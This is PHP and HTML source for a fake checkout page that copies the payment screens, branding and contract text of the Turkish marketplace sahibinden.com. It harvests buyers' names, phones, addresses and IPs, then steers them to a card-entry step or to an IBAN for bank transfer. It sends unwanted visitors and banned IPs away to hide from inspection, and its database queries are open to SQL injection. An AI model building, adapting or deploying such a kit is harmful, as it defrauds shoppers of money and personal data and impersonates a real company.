<?php
  include('settings/router.php');
  session_start();
  ob_start();
  $ip = $_SERVER['REMOTE_ADDR'];
  if(!$_GET){
    header('Location: https://www.google.com');
  }

  try {
    $conn = new PDO($dsn, $user, $password);
    $conn->exec("SET NAMES 'utf8'; SET CHARSET 'utf8'");
  } catch (PDOException $e) {
    print $e->getMessage();
  }

  //IP BAN
  $query2 = $conn->query("SELECT * FROM ban WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  if ($query2){
      header('Location: https://youtu.be/ezxYxeTDxTM?t=19');
    exit;
  }

  $q = $_GET['q'];
  $aa = $conn->query("SELECT * FROM ilan_telefon WHERE ilanurl = '{$q}'")->fetch(PDO::FETCH_ASSOC);
  $bb = $conn->query("SELECT * FROM ilan_playstation WHERE ilanurl = '{$q}'")->fetch(PDO::FETCH_ASSOC);

  if($aa) {
    $query = $aa;
  } else if ($bb) {
    $query = $bb;
  }

  if(($query['banks'] == 'creditcard')){
    if ($_POST){
        $firstName = trim(filter_input(INPUT_POST, 'firstName'));
        $lastName = trim(filter_input(INPUT_POST, 'lastName', FILTER_SANITIZE_EMAIL));
        $homePhone = trim(filter_input(INPUT_POST, 'homePhone'));
        $addressName = trim(filter_input(INPUT_POST, 'addressName'));
        $il = trim(filter_input(INPUT_POST, 'il'));
        $ilce = trim(filter_input(INPUT_POST, 'ilce'));
        $addressDetail = trim(filter_input(INPUT_POST, 'addressDetail'));
    
        if (empty($firstName) || empty($lastName) || empty($homePhone) || empty($addressName) || empty($il) || empty($ilce) || empty($addressDetail)){
            header("location:index.php");
            exit;
        }else{
            try{
                $query3 = $conn->prepare("INSERT INTO info SET firstName = ?, lastName = ?, homePhone = ?, addressName = ?, il = ?, ilce = ?, addressDetail=?, type=?, ip=?");
                $insert = $query3->execute(array($firstName, $lastName, $homePhone, $addressName, $il, $ilce, $addressDetail, "3D", $ip));

                if ($insert){
                    $id = $conn->lastInsertId();
                    $_SESSION["tum"] = ["id" => $id, "firstName" => $firstName, "lastName" => $lastName, "homePhone" => $homePhone, "ip" => $ip];
                    header("location:3d.php?id={$_SESSION["tum"]["id"]}&q={$_GET['q']}");
                }
            }
            catch(PDOException $e){
                die($e->getMessage());
            }
        }
    }
  }else {
    if ($_POST){
        $firstName = trim(filter_input(INPUT_POST, 'firstName'));
        $lastName = trim(filter_input(INPUT_POST, 'lastName', FILTER_SANITIZE_EMAIL));
        $homePhone = trim(filter_input(INPUT_POST, 'homePhone'));
        $addressName = trim(filter_input(INPUT_POST, 'addressName'));
        $il = trim(filter_input(INPUT_POST, 'il'));
        $ilce = trim(filter_input(INPUT_POST, 'ilce'));
        $addressDetail = trim(filter_input(INPUT_POST, 'addressDetail'));
    
        if (empty($firstName) || empty($lastName) || empty($homePhone) || empty($addressName) || empty($il) || empty($ilce) || empty($addressDetail)){
            header("location:index.php");
            exit;
        }else{
            try{
                $query3 = $conn->prepare("INSERT INTO info SET firstName = ?, lastName = ?, homePhone = ?, addressName = ?, il = ?, ilce = ?, addressDetail=?, type=?, ip=?");
                $insert = $query3->execute(array($firstName, $lastName, $homePhone, $addressName, $il, $ilce, $addressDetail, "Havale", $ip));

                if ($insert){
                    $id = $conn->lastInsertId();
                    $_SESSION["tum"] = ["id" => $id, "firstName" => $firstName, "lastName" => $lastName, "homePhone" => $homePhone, "ip" => $ip];
                    header("location:receipt.php?id={$_SESSION["tum"]["id"]}&q={$_GET['q']}");
                }
            }
            catch(PDOException $e){
                die($e->getMessage());
            }
        }
    }
  }

if ($query || $query3){

function addition($value) {
    $firstStep = explode(',', $value);
    $secondStep = explode('.', $firstStep[0]);
    @$last = $secondStep[0] . $secondStep[1];
    return $last;
}


function beforeCommas($value) {
    $firstStep = explode(',', $value);
    $mainMoney = $firstStep[0];
    return $mainMoney;
}

function afterCommas($value) {
    $firstStep = explode(',', $value);
    $afterCommas = $firstStep[1];
    return $afterCommas;
}
?>
<!DOCTYPE html>
<html class="" lang="tr">
  <head>
    <style type="text/css">
      @charset "UTF-8";
      [ng\:cloak],
      [ng-cloak],
      [data-ng-cloak],
      [x-ng-cloak],
      .ng-cloak,
      .x-ng-cloak,
      .ng-hide:not(.ng-hide-animate) {
        display: none !important;
      }

      ng\:form {
        display: block;
      }

      .ng-animate-shim {
        visibility: hidden;
      }

      .ng-anchor {
        position: absolute;
      }

      @media (max-width: 768px) {
        .address-container{
          display: flex;
          align-items: center;
          justify-content: center;
          flex-direction: column;
        }
        .address-container .left{
          margin-right: 0!important;
        }
        .address-container .right{
          margin-bottom: 50px;
        }
      }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta id="Content-Language" http-equiv="Content-Language" content="tr">
    <meta name="rating" content="general">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <meta name="revisit-after" content="1 Days">
    <link rel="shortcut icon" href="assets/css/favicon.ico" type="image/x-icon">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>sahibinden.com - Sat??l??k, Kiral??k, 2. El, Emlak, Oto, Araba, Bilgisayar, Film, Cep Telefonu, Elektronik, Antika, Giyim, Mobilya, Eleman Arayanlar ve daha fazlas?? - ??lan ve al????veri??te ilk adres</title>
    <link href="assets/css/common.css" media="screen, print" rel="stylesheet" type="text/css">
    <link href="assets/css/payment.css" media="screen, print" rel="stylesheet" type="text/css">
  </head>
  <body class="type-individual ios">
    <div class="header-banners clearfix">
      <div class="mast-head-banner">
    </div>
    <div class="header-container without-background">
      <div class="header secure-payment">
        <p class="clearfix">
          <a class="logo" href="https://www.sahibinden.com" title="sahibinden.com anasayfas??na d??n" style="pointer-events: none;"> sahibinden.com anasayfas??na d??n</a>
        </p>
        <h1>??deme Bilgileri</h1>
      </div>
    </div>
    <div id="container">
      <link href="/assets/css/dialog.css" type="text/css" rel="stylesheet">
      <div id="slsDialogFe" class="safe ng-scope">
        <div ng-include="'/views/myAccount/common/RenewSls/RenewSls.html'" class="ng-scope">
          <style class="ng-scope">
            .safe .hidden {
              visibility: hidden
            }

            .big-image {
                object-fit: contain;
                background: white;
            }

            .safe .dialog-content p {
              display: block;
              font-size: 14px;
              line-height: 19px;
              margin-bottom: 15px;
              color: #333
            }

            .safe .dialog-content .dialog-buttons {
              color: inherit;
              font-size: inherit;
              line-height: inherit;
              margin-bottom: inherit
            }

            .safe .dialog-content .form-error {
              color: #fb0317;
              font-size: 11px
            }

            .safe .dialog-content .btn-form {
              padding: 6px 16px
            }

            .safe .dialog-content .info-holder .contact {
              line-height: 1
            }

            .safe .dialog-content .info-holder .contact h3 {
              padding-bottom: 5px
            }

            .safe .dialog-content .info-holder .contact h4 {
              font-weight: 200
            }

            .renew-sls {
              width: 550px
            }

            .renew-sls h5 {
              font-size: 14px;
              line-height: 1.4em;
              color: #333;
              margin: 25px 0
            }

            .renew-sls .renewSlsForm {
              overflow: hidden
            }

            .renew-sls .renewSlsForm .left-column {
              width: 49%;
              float: left
            }

            .renew-sls .renewSlsForm .right-column {
              width: 49%;
              float: right
            }

            .renew-sls .renewSlsForm .button-section {
              padding: 20px 0 0;
              clear: both
            }

            .renew-sls .renewSlsForm .button-section h5 {
              margin: 10px 0 0;
              display: inline-block
            }

            .renew-sls .renewSlsForm p {
              color: #333;
              font-size: 12px;
              font-weight: 700;
              margin: 0 0 3px 0
            }

            .renew-sls .renewSlsForm input {
              width: 100%;
              box-sizing: border-box;
              margin-bottom: 20px
            }

            .renew-sls .renewSlsForm button {
              float: right;
              display: block;
              width: 150px
            }

            .classifiedDetailContent .renew-sls h5 {
              font-weight: normal
            }

            .classifiedDetailContent .renew-sls input[type='text']:disabled {
              color: #999;
              background-color: #f2f2f2
            }
          </style>
        </div>
      </div>
      <div class="set-payment-container set-payment-active-step-1">
        <div class="payment-progress">
          <div class="bar"></div>
          <ul>
            <li class="step-0"></li>
            <li class="step-1">
              <strong>1</strong>
              <span>??r??n</span>
              <span class="responsive-part">??r??n</span>
            </li>
            <li class="step-2">
              <strong>2</strong>
              <span>Adres</span>
              <span class="responsive-part">Adres</span>
            </li>
            <li class="step-3">
              <strong>3</strong>
              <span>??deme</span>
              <span class="responsive-part">??deme</span>
            </li>
            <li class="step-4">
              <strong>4</strong>
              <span class="last">??deme Al??nd??</span>
              <span class="responsive-part">??deme Al??nd??</span>
            </li>
          </ul>
        </div>
        <form action="#" method="POST" autocomplete="off">
            <div class="set-payment-step-1-detail">
                <div class="responsive-part classified-info-part">
                  <div class="image-part">
                    <img src="assets/images/phones/<?=str_replace("'", '', explode(',', $query['ilan_resim'])[0])?>" height="75" width="100" alt="">
                    <div class="favorite">
                      <h4><?=$query['ilanad']?></h4>
                    </div>
                  </div>
                  <div class="prices">
                    <div class="row first">
                      <span class="total-price-area right first total-price item-total-price small-currency price-format-renew"><?=beforeCommas($query['ilanfiyat'])?>,<span class="decimal"><?=afterCommas($query['ilanfiyat'])?></span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <div class="left first numeric-input-holder prev-disabled next-disabled disable"></div>
                    </div>
                    <div class="seperator"></div>
                    <div class="row">
                      <span class="paris-fee-area right total-price item-total-price small-currency price-format-renew"><?=beforeCommas($query['hizmetbedeli'])?>,<span class="decimal"><?=afterCommas($query['hizmetbedeli'])?></span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left">S - Param G??vende Hizmet Bedeli</p>
                    </div>
                    <div class="seperator"></div>
                    <div class="row">
                      <span class="paris-total-price-area right total-price small-currency price-format-renew"><?=addition($query['ilanfiyat']) + addition($query['hizmetbedeli'])?>,<span class="decimal">00</span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left total">Toplam</p>
                    </div>
                  </div>
                </div>
                <div class="responsive-part cargo-info">
                  <p> Sat??c??&nbsp;3&nbsp;i?? g??n?? i??inde kargolar.</p>
                </div>
                <div class="left-box">
                  <div>
                    <div class="sub-left-box paris-info-box">
                      <div>
                        <a class="secure-image"></a>
                        <h3>Paran??z G??vende</h3>
                      </div>
                      <p>??demeniz siz ??r??n?? teslim al??p onaylad??ktan sonra sat??c??ya aktar??l??r.</p>
                      <div>
                        <a class="shipping-image"></a>
                        <h3>??cretsiz Kargo</h3>
                      </div>
                      <p>Ald??????n??z ??r??n anla??mal?? kargo ile taraf??n??za ??cretsiz olarak kargolan??r.</p>
                      <div>
                        <a class="return-image"></a>
                        <h3>Kolay ??ade</h3>
                      </div>
                      <p class="last">??r??n ilandakinden farkl?? ????karsa sat??c??ya kargolay??p ??r??n tutar??n?? geri alabilirsiniz. </p>
                    </div>
                  </div>
                </div>
                <div class="right-box">
                  <div class="sub-right-box item">
                    <img class="big-image" src="assets/images/phones/<?=str_replace("'", '', explode(',', $query['ilan_resim'])[0])?>" height="174" width="232" alt="">
                    <span><?=$query['ilanad']?></span>
                  </div>
                  <div class="sub-right-box prices">
                    <div class="row">
                      <span class="total-price-area right unit-price total-price item-total-price small-currency price-format-renew"><?=beforeCommas($query['ilanfiyat'])?>,<span class="decimal"><?=afterCommas($query['ilanfiyat'])?></span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <div class="left unit numeric-input-holder prev-disabled next-disabled disable"></div>
                    </div>
                    <div class="seperator"></div>
                    <div class="row">
                      <span class="paris-fee-area right high total-price item-total-price small-currency price-format-renew"><?=beforeCommas($query['hizmetbedeli'])?>,<span class="decimal"><?=afterCommas($query['hizmetbedeli'])?></span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left">S - Param G??vende Hizmet Bedeli</p>
                    </div>
                    <div class="seperator"></div>
                    <div class="total-cost-container row">
                      <span id="parisTotalCostSpan" class="paris-total-price-area right total-price small-currency price-format-renew"><?=addition($query['ilanfiyat']) + addition($query['hizmetbedeli'])?>,<span class="decimal">00</span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left total">Toplam</p>
                    </div>
                  </div>
                  <div class="sub-right-box cargo-info">
                    <p> Sat??c??&nbsp;3&nbsp;i?? g??n?? i??inde kargolar.</p>
                  </div>
                  <a class="btn btn-new go-to-address-btn">Teslimat Adresi Se??</a>
                </div>
                <div class="responsive-part go-to-address-btn-wrapper">
                  <a class="btn btn-new go-to-address-btn responsiveBtn">Teslimat Adresi Se??</a>
                </div>
              </div>
              <div class="set-payment-step-2-detail">
                <div class="responsive-part address">
                  <div class="image-part">
                    <img src="assets/images/phones/<?=str_replace("'", '', explode(',', $query['ilan_resim'])[0])?>" height="38" width="50" alt="">
                    <div class="favorite">
                      <h4><?=$query['ilanad']?></h4>
                    </div>
                  </div>
                  <div class="prices">
                    <div class="row">
                      <span class="total-price-area right thin total-price small-currency price-format-renew"><?=beforeCommas($query['ilanfiyat'])?>,<span class="decimal"><?=afterCommas($query['ilanfiyat'])?></span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <div class="left"> ??r??n Tutar?? <span class="responsive-item-count disable"> (1 adet) </span>
                      </div>
                    </div>
                    <div class="row">
                      <span class="paris-fee-area right thin total-price small-currency price-format-renew"><?=beforeCommas($query['hizmetbedeli'])?>,<span class="decimal"><?=afterCommas($query['hizmetbedeli'])?></span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left">S - Param G??vende Hizmet Bedeli</p>
                    </div>
                    <div class="row">
                      <span class="paris-total-price-area right total-price small-currency price-format-renew"><?=addition($query['ilanfiyat']) + addition($query['hizmetbedeli'])?>,<span class="decimal">00</span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left total">Toplam</p>
                    </div>
                  </div>
                </div>
                <div class="left-box">
                  <div class="sub-left-box address-box">
                    <div class="closed-address-form hidden">
                      <div class="address-header">
                        <h3>TESL??MAT ADRES??</h3>
                      </div>
                      <div class="sub-address-box left">
                        <p class="address-box-header">
                          <span class="name">Teslimat Adresi</span>
                          <a id="newShippingAddressBtn" data-type="delivery" class="btn-link new-address trackClick trackId_teslimatAdresi delivery" data-click-category="adresSecimi">Yeni Adres Ekle</a>
                        </p>
                        <div class="edit-mode">
                          <div class="address-list"></div>
                        </div>
                      </div>
                    </div>
                    <div class="open-address-form ">
                      <h3 id="addressPopupTitle">YEN?? TESL??MAT ADRES??</h3>
                        <div class="address-container clearfix">
                          <div class="address-part left">
                            <div class="name-column first-last-name">
                              <label for="firstName-1">Ad</label>
                              <input type="text" id="firstName" name="firstName" maxlength="50" class="firstName">
                              <span class="errorLabel">L??tfen ad??n??z?? girin</span>
                            </div>
                            <div class="name-column first-last-name">
                              <label for="lastName-1">Soyad</label>
                              <input type="text" id="lastName" name="lastName" maxlength="50" class="lastName">
                              <span class="errorLabel">L??tfen soyad??n??z?? girin</span>
                            </div>
                            <label for="homePhone-1">Telefon</label>
                            <input type="tel" id="homePhone" name="homePhone" class="homePhone" placeholder="??rn: 532 123 4567" title="??rn: 532 123 4567" maxlength="17" autocomplete="off">
                            <span class="errorLabel">L??tfen telefon numaras?? girin</span>
                            <div class="address-name-action-container  ">
                              <label for="addressName-1">Adres Ad??</label>
                              <input type="text" id="addressName" name="addressName" class="addressName" placeholder="??rn: Ev Adresi, ???? Adresi">
                              <span class="errorLabel">L??tfen adres tan??m?? girin</span>
                              <div class="address-action-area  hidden">
                                <div class="kvkk-info"> Ki??isel verilerin i??lenmesine dair <a href="#" class="kvkkInformationLink">ayd??nlatma</a>
                                </div>
                                <a href="javascript:;" class="btn btn-new btn-new-alternative popup-cancel-edit-save-address">Vazge??</a>
                                <a id="newAddressSaveUpdateBtn" href="javascript:;" class="btn btn-new new-address-save trackClick trackId_yeniAdres" data-click-category="adresSecimi">Ekle</a>
                                <a id="editAddressSaveUpdateBtn" href="javascript:;" class="btn btn-new edit-address-save trackClick trackId_guncelleAdres" data-click-category="adresSecimi">Kaydet</a>
                              </div>
                            </div>
                          </div>
                          <div class="address-part right">
                            <label for="city-1">??l</label>
                            <label for="city" class="hybrid-select">
                              <select name="il" id="il" class="city selectedOption">
                                <option value="" disabled selected>Se??im Yap??n??z</option>
                              </select>
                            </label>
                            <label for="town-1">??l??e</label>
                            <label for="town" class="hybrid-select">
                              <select name="ilce" id="ilce" class="town">
                                <option value="" disabled selected>Se??im Yap??n??z</option>
                              </select>
                              <span class="errorLabel">L??tfen il??e se??in</span>
                            </label>
                            <label for="addressDetail-1">A????k Adres</label>
                            <textarea name="addressDetail" id="addressDetail" class="addressDetail" placeholder="Semt, cadde vb. bilgiler"></textarea>
                            <span class="errorLabel">L??tfen adres girin</span>
                          </div>
                        </div>
                    </div>
                    <div class="kvkk-wrapper"> Ki??isel verilerin i??lenmesine dair <a href="#" class="kvkkInformationLink">ayd??nlatma</a>
                    </div>
                  </div>
                  <a class="back-to-the-future go-to-info-btn urunBack" data-click-category="sepetDetayi" style="display: inline">&lt; ??r??n Ad??m??na Geri D??n</a>
                </div>
                <div class="right-box">
                  <div class="sub-right-box item">
                    <img class="big-image" src="assets/images/phones/<?=str_replace("'", '', explode(',', $query['ilan_resim'])[0])?>" height="174" width="232" alt="">
                    <span><?=$query['ilanad']?></span>
                  </div>
                  <div class="sub-right-box prices">
                    <div class="row">
                      <span class="total-price-area right unit-price total-price item-total-price small-currency price-format-renew"><span class="fiyat"><?=beforeCommas($query['ilanfiyat'])?></span>,<span class="decimal"><?=afterCommas($query['ilanfiyat'])?></span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <div class="left unit numeric-input-holder prev-disabled next-disabled disable"></div>
                    </div>
                    <div class="seperator"></div>
                    <div class="row">
                      <span class="paris-fee-area right high total-price item-total-price small-currency price-format-renew"><?=beforeCommas($query['hizmetbedeli'])?>,<span class="decimal"><?=afterCommas($query['hizmetbedeli'])?></span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left">S - Param G??vende Hizmet Bedeli</p>
                    </div>
                    <div class="installment-cost-container disable">
                      <div class="seperator"></div>
                      <div class="row">
                        <span id="installmentCostSpan" class="right total-price item-total-price small-currency price-format-renew">100 <span class="total-price-currency"> TL</span>
                          <span class="sum-label"></span>
                        </span>
                        <p class="left">Taksit Fark??</p>
                      </div>
                    </div>
                    <div class="seperator"></div>
                    <div class="total-cost-container row">
                      <span id="parisTotalCostSpan" class="paris-total-price-area right total-price small-currency price-format-renew"><?=addition($query['ilanfiyat']) + addition($query['hizmetbedeli'])?>,<span class="decimal">00</span>
                        <span class="total-price-currency"> TL</span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left total">Toplam</p>
                    </div>
                  </div>
                  <?php 
                    $type = $query['banks'];
                    if($type == 'creditcard') {
                      echo "<button id='makePaymentButton' class='btn btn-new make-payment-btn trackClick trackId_complete_purchase_v3 completeBtn2' type='submit'>??deme Ad??m??na Ge??</button>";
                    } else {
                      echo "<a href='#' id='proceedToPayment' class='btn btn-new go-to-payment-btn trackClick trackId_go_to_purchase_v3 purchaseBtn'>??deme Ad??m??na Ge??</a>";
                    }
                  ?>
                </div>
                <div class="responsive-part go-to-payment-btn-wrapper">
                  <div class="paris-wrapper kvkk-wrapper"> Ki??isel verilerin i??lenmesine dair <a href="#" class="kvkkInformationLink">ayd??nlatma</a>
                  </div>

                  <?php 
                    $type = $query['banks'];
                    if($type == 'creditcard') {
                      echo "<button class='btn btn-new make-payment-btn trackClick trackId_complete_purchase_v3 responsivePurchase' type='submit'>??deme Ad??m??na Ge??</button>";
                    } else {
                      echo "<a href='#' class='btn btn-new go-to-payment-btn trackClick trackId_go_to_purchase_v3 responsivePurchase'>??deme Ad??m??na Ge??</a>";
                    }
                  ?>
                </div>
              </div>
              <div class="set-payment-step-3-detail">
              <div class="left-box">
          <div class="sub-left-box credit-card-box">
            <div class="address-header">
              <h3>PARAM G??VENDE ??LE G??VENL?? ??DEME</h3>
            </div>
            <div id="creditCardPayment" class="paymentTypes">
              <div class="credit-card-form">
                <div class="left-column">
                  <h2 style="color:Red; font-size: small; font-weight: bold;">A??a????daki iban numaras??na Havale/EFT (Haftasonlar?? Fast ile ??deme Yap??n??z!) Yoluyla ??deme yapt??ktan sonra ??demeyi tamamla butonuna bas??n??z. Ekibimiz gerekli kontrol?? sa??lay??p sat??c??dan ??r??n??n kargolanmas??n?? talep edecektir.</h2>
                  <div class="box">
                    <div class="left">
                      <?php
                          if($query['banks'] != 'creditcard') {
                            $bank = $query['banks'];
                            echo "<img src='assets/images/banks/$bank.jpg' alt='Banka'>";
                          }
                      ?>
                      
                    </div>
                    <div class="right">
                      <nav class="details">
                        <ul>
                          <li>
                            <span class="holder">Hesap Sahibi :</span>
                            <span class="holder-name"><?=$query['hesapsahibi']?></span>
                          </li>
                          <li>
                            <span class="iban">IBAN Numaras?? :</span>
                            <input class="iban-number" readonly placeholder="<?=$query['iban']?>" value="<?=$query['iban']?>">
                          </li>
                         
                          <li>
                            <div class="warn">
                              <div class="alert alert-warning">
                                <strong>Dikkat!</strong>
                                <span>Banka Hesab??m??za Para Yat??rd??ktan Sonra ??deme Bildirimi Yap??n??z.</span>
                              </div>
                            </div>
                          </li>
                        </ul>
                      </nav>
                      <button aria-label="iban-copy" class="ibanBtn">IBAN Kopyala</button>
                    </div>
                  </div>
                </div>
              </div>
              <div class="hidden">
                <input type="checkbox" name="mss" id="mss-hidden">
                <input type="checkbox" name="saveAsProfile" id="saveCCProfile-hidden">
              </div>
            </div>
          </div>
  <div class="sub-left-box mss-aggrement agreement-service">
    <strong>S - PARAM G??VENDE H??ZMET S??ZLE??MES??</strong>
    <div id="servicePriceAgreement" class="mss-container">
      <div class="mss-content">
        <div style="color:#999999;">
          <p id="servicePricePreInfoTitle" style="margin:0 0 10px 0; text-decoration:underline; font-weight:bold;">??N B??LG??LEND??RME FORMU</p>
          <p style="margin:0 0 15px 0; font-weight:bold;"> H??ZMET VEREN??N B??LG??LER?? </p>
          <p style="margin:0 0 2px 0;">
            <span style="font-weight:bold;">Ticaret Unvan??:</span> Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret A.??.
          </p>
          <p style="margin:0 0 2px 0;">
            <span style="font-weight:bold;">Kep adresi:</span> sahibinden@hs02.kep.tr
          </p>
          <p style="margin:0 0 2px 0;">
            <span style="font-weight:bold;">MERS??S numaras??:</span> 0739014655600017
          </p>
          <p style="margin:0 0 15px 0;">
            <span style="font-weight:bold;">Adresi:</span> De??irmenyolu Cad. No:28 Asia Ofis Park ????m. A Blok Kat:2 Ata??ehir/??stanbul
          </p>
          <p style="margin:0 0 2px 0;">www.sahibinden.com portal??nda ???Bireysel ??ye??? olarak ve ???S-Param G??vende Hizmeti??? ile ??r??n sipari?? etmek isteyen Hizmet Alan (???Al??c?????) olarak a??a????da detaylar?? belirtilen ???S-Param G??vende Hizmeti???ne (???Hizmet???) ili??kin sipari??i onaylamakta ve ???Hizmet???i a??a????daki fiyat ve ko??ullarla sat??n almay?? kabul etmektesiniz.</p>
          <p style="margin:0 0 30px 0;">????bu S??zle??me, s??zle??menin kurulmas??ndan sonra Hizmet Veren taraf??ndan Hizmet Alan???a (???Al??c?????ya) e-posta ile g??nderilecektir.</p>
          <p style="margin:0 0 15px 0; font-weight:bold;">H??ZMET B??LG??LER??:</p>
          <p style="margin:0 0 2px 0;">Hizmet Ad??: ???S-Param G??vende???</p>
          <p style="margin:0 0 2px 0;">Hizmet A????klamas??: Ek-1 olarak sunulan S-Param G??vende Hizmetine ili??kin detayl?? bilgileri inceleyiniz</p>
          <p style="margin:0 0 2px 0;">Adedi: 1</p>
          <p style="margin:0 0 2px 0;">Pe??in Fiyat?? (t??m vergiler d??hil): <span id="parisFeeUnit"> <?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
          </p>
          <p style="margin:0 0 2px 0;">??deme ??ekli: Havale/EFT</p>
          </p>
          <table border="1" cellspacing="0" cellpadding="10" style="min-height: 75px; width: 100%; margin-bottom: 20px; border-collapse: collapse;border: 1px solid #d8d8d8; white-space: nowrap; color: #999999;" class="agreement-table">
            <tbody>
              <tr style="text-align: left; color: #999;">
                <th style="width: 100%; border: 1px solid #d8d8d8;">Hizmet Ad??</th>
                <th style="border: 1px solid #d8d8d8;">Adet</th>
                <th style="border: 1px solid #d8d8d8;">Pe??in Fiyat??*</th>
                <th style="border: 1px solid #d8d8d8;">Toplam Tutar**</th>
                <th class="installment-price-info" style="border: 1px solid #d8d8d8;display: none;">Taksitle ??denecek Toplam Tutar***</th>
              </tr>
              <tr>
                <td style="white-space: normal; border: 1px solid #d8d8d8;">S - Param G??vende Hizmeti</td>
                <td style="border: 1px solid #d8d8d8;">1</td>
                <td style="border: 1px solid #d8d8d8;" class="nowrap">
                  <span id="parisFeeUnit"> <?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                </td>
                <td style="border: 1px solid #d8d8d8;" class="nowrap">
                  <span id="parisFeeUnit"> <?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                </td>
                <td class="nowrap installment-price-info" style="border: 1px solid #d8d8d8;display: none;">
                  <span id="parisFeeTotal"> <?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                </td>
              </tr>
            </tbody>
          </table>
          <ul class="table-description" style="list-style-type: none; color: #999999; margin-bottom: 10px; padding: 0;">
            <li>* T??m vergiler dahil pe??in birim fiyat?? g??sterir.</li>
            <li>** T??m vergiler dahil toplam tutar?? g??sterir.</li>
            <li class="installment-price-info" style="display: none;">*** T??m vergiler ve taksit fark?? dahil toplam tutar?? g??sterir.</li>
          </ul>
          </p>
          <p style="margin:0 0 2px 0; font-weight:bold;">CAYMA HAKKI:</p>
          <p style="margin:0 0 2px 0;">Mesafeli S??zle??meler Y??netmeli??i???nin 15(h) maddesinde ???cayma hakk?? s??resi sona ermeden ??nce t??keticinin onay?? ile ifas??na ba??lanan hizmet s??zle??meleri??? cayma hakk??n??n istisnas?? olarak kabul edildi??inden; ???Hizmet Alan??? i??bu s??zle??meye konu ???Hizmet??? bak??m??ndan cayma hakk??n??n olmad??????n?? kabul eder. </p>
          <p style="margin:0 0 15px 0;">???Hizmet Alan???, Mesafeli S??zle??meler Y??netmeli??i gere??i cayma hakk??na ili??kin bilgilendirmenin gere??i gibi yap??ld??????n?? kabul eder. </p>
          <p style="margin:0 0 15px 0; font-weight:bold;">S-PARAM G??VENDE H??ZMET S??ZLE??MES?? (???S??ZLE??ME???)</p>
          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 1- TARAFLAR </p>
          <p style="margin:0 0 2px 0; font-weight:bold; text-decoration:underline;">H??ZMET VEREN (???SAH??B??NDEN???)</p>
          <p style="margin:0 0 2px 0;">Unvan: Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret A.??.</p>
          <p style="margin:0 0 2px 0;">Adresi: De??irmenyolu Cad. No: 28 Asia Ofis Park ???? Merkezi A Blok Kat: 2 ????erenk??y Ata??ehir ??stanbul</p>
          <p style="margin:0 0 2px 0;">MERS??S numaras??: 0739014655600017</p>
          <p style="margin:0 0 2px 0;">Telefon: 0 850 222 44 44</p>
          <p style="margin:0 0 2px 0;">E-mail: sahibinden@hs02.kep.tr</p>
          <p style="margin:0 0 15px 0;">??ikayetler i??in ??rtibat Bilgisi: 0 850 222 44 44</p>
          <p style="margin:0 0 2px 0; font-weight:bold; text-decoration:underline;">H??ZMET ALAN (???ALICI???)</p>
          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 2- S??ZLE??MEN??N KONUSU:</p>
          <p style="margin:0 0 15px 0;">????bu ???S??zle??me???nin konusu; ???Hizmet Veren??? taraf??ndan www.sahibinden.com alan adl?? internet sitesi (???Portal???) ??zerinden ???Hizmet Alan???a sa??lanmakta olan, ???S??zle??me???nin 3.maddesinde ??zellikleri ve fiyat?? belirtilen S-Param G??vende hizmetine (???Hizmet???e) ili??kin olarak taraflar??n hak ve y??k??ml??l??klerinin tespitidir. </p>
          <p style="margin:0 0 15px 0;">????bu ???S??zle??me???, T??keticinin Korunmas?? Hakk??nda Kanun ve Mesafeli S??zle??meler Y??netmeli??i???ne uygun olarak d??zenlenmi??tir. ????bu S??zle??me???de h??k??m bulunmayan hallerde T??keticinin Korunmas?? Hakk??nda Kanun ve Mesafeli S??zle??meler Y??netmeli??i???nde yer alan h??k??mler uygulan??r. ????bu ???S??zle??me???nin taraflar??; ???S??zle??me??? ile birlikte T??keticinin Korunmas?? Hakk??nda Kanun ve Mesafeli S??zle??meler Y??netmeli??i???nden kaynaklanan y??k??ml??l??k ve sorumluluklar??n?? bildiklerini ve anlad??klar??n?? kabul ve beyan ederler. </p>
          <p style="margin:0 0 15px 0;">????bu ???S??zle??me???, ???Hizmet Alan?????n ???T??ketici??? oldu??u hallerde uygulanacakt??r. ???Hizmet Alan?????n mesleki veya ticari ama??larla ???Hizmet???i sat??n ald?????? hallerde; ???Hizmet Alan??? onaylam???? olsa dahi i??bu ???S??zle??me??? h??k??mleri uygulanmayacakt??r. </p>
